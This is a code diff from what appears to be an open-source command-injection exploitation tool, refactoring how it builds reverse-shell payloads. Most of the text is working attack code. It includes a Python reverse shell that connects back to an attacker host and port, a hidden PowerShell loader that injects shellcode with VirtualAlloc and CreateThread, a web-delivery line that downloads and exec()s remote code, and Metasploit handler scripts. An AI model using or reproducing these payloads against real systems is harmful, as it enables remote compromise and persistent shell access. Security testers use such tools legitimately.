@@ -323,7 +323,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
 
     # Python-reverse-shell 
     elif other_shell == '4':
-      other_shell = "python -c 'import socket,subprocess,os%0d" \
+      other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c 'import socket,subprocess,os%0d" \
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                     "s.connect((\"" + settings.LHOST  + "\"," + settings.LPORT + "))%0d" \
                     "os.dup2(s.fileno(),0)%0d" \
@@ -373,7 +373,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print(settings.SUCCESS_STATUS)
+        print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -390,7 +390,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print(settings.FAIL_STATUS)
+        print(settings.SINGLE_WHITESPACE)
       break
 
     # Python-reverse-shell
@@ -421,7 +421,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
         set_python_working_dir()
         other_shell = settings.WIN_PYTHON_DIR + data
       else:
-        other_shell = "python" + data
+        other_shell = settings.LINUX_PYTHON_INTERPRETER + data
       break
 
     # Python-reverse-shell (meterpreter)
@@ -446,9 +446,9 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
         with open (output, "r") as content_file:
           data = content_file.readlines()
           data = ''.join(data)
-          data = base64.b64encode(data)
+          data = base64.b64encode(data.encode(settings.UNICODE_ENCODING)).decode()
 
-        print(settings.SUCCESS_STATUS)
+        print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -462,10 +462,10 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           set_python_working_dir()
           other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
         else:
-          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+          other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c \"exec('" + data + "'.decode('base64'))\""
         msf_launch_msg(output)
       except:
-        print(settings.FAIL_STATUS)
+        print(settings.SINGLE_WHITESPACE)
       break
     
     # Powershell injection attacks
@@ -515,7 +515,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
               # Greetz to Dave Kennedy (@HackingDave)
               powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))
               other_shell = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  
-              print(settings.SUCCESS_STATUS)
+              print(settings.SINGLE_WHITESPACE)
               with open(output, 'w+') as filewrite:
                 filewrite.write("use exploit/multi/handler\n"
                                 "set payload " + payload + "\n"
@@ -524,7 +524,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
                                 "exploit\n\n")
               msf_launch_msg(output)
             except:
-              print(settings.FAIL_STATUS)
+              print(settings.SINGLE_WHITESPACE)
             break
 
           # TrustedSec's Magic Unicorn (3rd Party)
@@ -553,7 +553,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
                 with open(output, 'r') as content_file:
                   other_shell = content_file.read().replace('\n', '')
                 other_shell = _urllib.parse.quote_plus(other_shell) 
-                print(settings.SUCCESS_STATUS)
+                print(settings.SINGLE_WHITESPACE)
                 # Remove the ouput file
                 os.remove(output)
                 with open("unicorn.rc", 'w+') as filewrite:
@@ -568,7 +568,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
               except:
                 continue 
             except:
-              print(settings.FAIL_STATUS)
+              print(settings.SINGLE_WHITESPACE)
             break
 
           # Regsvr32.exe application whitelisting bypass
@@ -633,12 +633,12 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
 
           if web_delivery == '1':
             data = "; r=_urllib.request.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
-            data = base64.b64encode(data)
+            data = base64.b64encode(data.encode(settings.UNICODE_ENCODING)).decode()
             if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
               set_python_working_dir()
               other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
             else:
-              other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+              other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c \"exec('" + data + "'.decode('base64'))\""
             msf_launch_msg(output)
             break
           elif web_delivery == '2':
